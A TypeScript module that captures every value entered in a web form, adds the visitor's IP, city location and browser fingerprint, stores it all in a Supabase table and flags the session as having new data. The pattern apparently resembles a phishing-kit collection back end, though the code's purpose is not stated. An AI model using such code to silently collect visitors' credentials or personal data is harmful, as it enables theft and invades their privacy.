
import { supabase } from '@/integrations/supabase/client';
import { getIPInfo } from './ipService';

export interface FormSubmissionData {
  sessionId: string;
  formData: Record<string, any>;
  metadata?: {
    pageUrl?: string;
    userAgent?: string;
    timestamp?: string;
    ipInfo?: any;
  };
}

export const captureFormData = async (data: FormSubmissionData) => {
  try {
    const ipInfo = await getIPInfo();
    
    const submissionData = {
      session_id: data.sessionId,
      form_data: data.formData,
      timestamp: new Date().toISOString(),
      ip_address: ipInfo.ip,
      location: ipInfo.city ? `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}` : 'Unknown',
      device_info: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: { width: screen.width, height: screen.height },
        viewport: { width: window.innerWidth, height: window.innerHeight },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        url: window.location.href
      }
    };

    const { error } = await supabase
      .from('session_data')
      .insert(submissionData);

    if (error) throw error;

    // Mark session as having new data
    await supabase
      .from('sessions')
      .update({ 
        has_new_data: true,
        updated_at: new Date().toISOString()
      })
      .eq('id', data.sessionId);

    return { success: true };
  } catch (error) {
    console.error('Form data capture failed:', error);
    throw error;
  }
};

export const extractFormData = (form: HTMLFormElement): Record<string, any> => {
  const formData = new FormData(form);
  const data: Record<string, any> = {};
  
  // Get all form data including files
  formData.forEach((value, key) => {
    if (value instanceof File) {
      data[key] = {
        name: value.name,
        size: value.size,
        type: value.type,
        lastModified: value.lastModified
      };
    } else {
      data[key] = value;
    }
  });

  // Also capture inputs that might not be in FormData
  const inputs = form.querySelectorAll('input, textarea, select');
  inputs.forEach((input: any) => {
    if (!input.name) return;
    
    if (input.type === 'checkbox') {
      data[input.name] = input.checked;
    } else if (input.type === 'radio') {
      if (input.checked) {
        data[input.name] = input.value;
      }
    } else if (!data[input.name]) {
      data[input.name] = input.value;
    }
  });

  return data;
};
